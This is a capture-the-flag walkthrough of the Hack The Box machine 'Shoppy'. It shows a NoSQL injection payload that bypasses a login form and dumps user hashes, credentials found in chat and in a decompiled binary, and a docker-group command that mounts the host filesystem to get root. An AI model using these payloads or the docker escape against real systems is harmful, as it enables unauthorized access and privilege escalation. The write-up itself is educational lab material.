## Summary

1. **Reconnaissance**:
    
    - Scanned target for open ports and discovered services including HTTP and a possible subdomain.
    - Found a web application and potential backend service (Mattermost).
    
2. **Enumeration**:
    
    - Performed directory and subdomain brute-forcing to identify login pages and subdomains.
    - Exploited NoSQL injection to bypass authentication on Mattermost and extract user information.
    
3. **Privilege Escalation to `jaeger`**:
    
    - Used extracted credentials to gain SSH access as a standard user.
    
4. **Binary Analysis**:
    
    - Found a binary executable with `sudo` permissions.
    - Decompiled the binary to identify a hardcoded master password and used it to retrieve further credentials.
    
5. **Privilege Escalation to `deploy`**:
    
    - Used the credentials obtained from the binary to switch to the `deploy` user.
    - Discovered that `deploy` belonged to the `docker` group.
    
6. **Root Privilege Escalation**:
    
    - Exploited Docker group membership to escape the container and gain root access.
    - Retrieved the root flag.

### Key Techniques:

- NoSQL injection for authentication bypass and user enumeration.
- Binary reverse engineering to extract a hardcoded password.
- Docker privilege escalation to break out of a restricted environment.

```

Overall, there are 3 open ports; `22`, `80`, `9093`. Have no idea what the port `9093` is yet.
The `nmap` scan reveals that the domain of `http` service is `http://shoppy.htb`.
The `nginx` version doesn't seem to be vulnerable yet based on `searchsploit`.
Let's visit `http(80)` first.

### http(80)

![](attachments/shoppy_1.png)

The first index page shows that the service is not open yet with timer.
It looks like the site is for online shopping.. Maybe purchase, or storage services are running..?

```

`nikto` scan found that it has `/login` page. Other than that, there's nothing useful.
Also, given the find of `wp-config.php`, I think the server is running on `wordpress` and php.
Before visiting the login page, let's run `gobuster` first.

```bash

```

Several pages are found, and `/admin`, `login` pages look interesting..
Let's visit `/login` page.

![](attachments/shoppy_2.png)

It's a simple login page. `/admin` is also redirected to this login page. I checked its source code, but nothing useful. I tried to capture the request and response using `Burpsuite` but no useful information found..

Just in case if it has vHosts, let's try `ffuf`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fs 169 -s
```

No other vHosts found here... What about subdomain?
Let's try finding sub-domains using `ffuf` again.

At this time, I'm using a larger wordlists : `bitquark-subdomains-top100000.txt`

```bash
┌──(kali㉿kali)-[~/htb]
└─$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169

```

`mattermost` is found here.
As long as I know, mattermost is a chat application which can be hosted locally.

### http(80) - Mattermost

![](attachments/shoppy_3.png)

I tested this login input with sqli wordlist(`/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt`), but it doesn't seem working.
Instead, let me try NoSQL Injection.

##### NoSQL Injection

Here are some references:
https://book.hacktricks.xyz/pentesting-web/nosql-injection
https://nullsweep.com/a-nosql-injection-primer-with-mongo/

First let's catch the login request again.

```shell
{"device_id":"","login_id":"admin","password":"passwd","token":""}
```

Based on the article mentioned above, `' || 'a'=='a` can help us inject SQL.

```perl
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
<SNIP>

username=admin%27+%7C%7C+%271%27+%3D%3D+%271&password=test
```

With this query, the expected full query is supposed to be like the following;

`'username'=='admin' || '1'=='1' && 'password'=='test'`
The formula of this will be `False || True && False` => Which ends up being `True`

![](attachments/shoppy_4.png)

Now I can see the "Shoppy App" page. On its top right corner, there's `Search for users` menu.
Let me click it.



# Shell as  `jaeger`

### Reuse NoSQL Injection

![](attachments/shoppy_5.png)

This shows an input tab for the user search, and once I type in any name, it shows "Download export".

![](attachments/shoppy_6.png)

If I click the button, it leads us to JSON page.
Possibly it's using same DB and query logic(NoSQL) on its backend.
So, let me try the same injection query : `admin' || '1' == '1`

This will complete the query like the following;
`'username'=='admin' || '1' == '1'`
If it works, it will retrieve all existing user data.

![](attachments/shoppy_7.png)

With the injection query, I can find one more user : `josh`
The information found of `josh` is as follows;

```
_id : "62db0e93d6d6a999a66ee67b"
username : "josh"
password : "6ebcea65320589ca4f2f1ce039975995"
```

```

The cracked password is `remembermethisway`
With this credential, let's try logging into mattermost as well.

![](attachments/shoppy_8.png)

In the mattermost app, I can find a chat that reveals a new credential: `jaeger` : `Sh0ppyBest@pp!`
Since I couldn't find the username from previous user retrieval, I think I can use this credential to different service.. Maybe ssh(22)?

Plus, `josh` says that `docker` will be deployed on the system. We might need to enumerate to find docker system after getting a shell.

```bash
┌──(kali㉿kali)-[~/htb]

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

##### Investigate binary

There's an unusual executable named `password-manager`, which is deployed on `/home/deploy`.
Probably, there's another user named `deploy` as we can guess from the directory name.

```swift
jaeger@shoppy:~$ file /home/deploy/password-manager
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
```

It's an ELF file which is executable.. With `strings` command, there's no useful information found.. Since there's no clue yet, let's just run it.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: test
Access denied! This incident will be reported !
```

To extract password from the binary, let's use decompiler. I'm using online decompiler (`dogbolt.org`).

```C++
bool main(void)

{
  int iVar1;
  ostream *poVar2;
  string local_68 [32];
  string local_48 [47];
  allocator local_19 [9];
  
  poVar2 = std::operator<<((ostream *)std::cout,"Welcome to Josh password manager!");
  std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
  std::operator<<((ostream *)std::cout,"Please enter your master password: ");
  std::string::string(local_48);
  std::operator>>((istream *)std::cin,local_48);
  std::allocator<char>::allocator();
  std::string::string(local_68,"",local_19);
  std::allocator<char>::~allocator((allocator<char> *)local_19);
  std::string::operator+=(local_68,"S");
  std::string::operator+=(local_68,"a");
  std::string::operator+=(local_68,"m");
  std::string::operator+=(local_68,"p");
  std::string::operator+=(local_68,"l");
  std::string::operator+=(local_68,"e");
  iVar1 = std::string::compare(local_48);
  if (iVar1 != 0) {
    poVar2 = std::operator<<((ostream *)std::cout,"Access denied! This incident will be reported !")
    ;
    std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
  }
  else {
    poVar2 = std::operator<<((ostream *)std::cout,"Access granted! Here is creds !");
    std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
    system("cat /home/deploy/creds.txt");
  }
  std::string::~string(local_68);
  std::string::~string(local_48);
  return iVar1 != 0;
}
```

The decompiled code reveals that the master password is hardcoded as `Sample`. 
The program compares the user input (`local_48`) with this password (`local_68`) using `std::string::compare`. 
If the input matches `Sample`, access is granted, and it runs the command to display the credentials.
This hardcoding makes it easy to extract the password and is a security flaw.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

With the extracted password `Sample`, it reveals user `deploy`'s password : `Deploying@pp!`
Let's move up to `deploy` using this credential through `su`

```bash
jaeger@shoppy:~$ su deploy
Password: 
$ whoami
deploy
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

# Shell as `root`

### Enumeration

##### sudo -l & SUID

```bash
$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for deploy: 
Sorry, user deploy may not run sudo on shoppy.

$ find / -perm -4000 2>/dev/null

```

I think it'd be better to have more deep investigation. So let's run `linpeas`.

```bash
deploy@shoppy:/tmp$ ./linpeas_linux_amd64 

<SNIP>

╔══════════╣ My user

```

The only useful information is that the current user `deploy` belong to `docker` group.
Which means that the shell we have might be in `docker`.
If so, we have to break out from `docker`.

Here's an useful reference :
<https://gtfobins.github.io/gtfobins/docker/>

To break out exploiting `docker`, we have to run the following command;

```bash
deploy@shoppy:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root

# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@ad47c0200333:/# id

```

Yeah, now I'm root!

```bash
root@ad47c0200333:/# cd /root
root@ad47c0200333:~# ls

root@ad47c0200333:~# cat root.txt
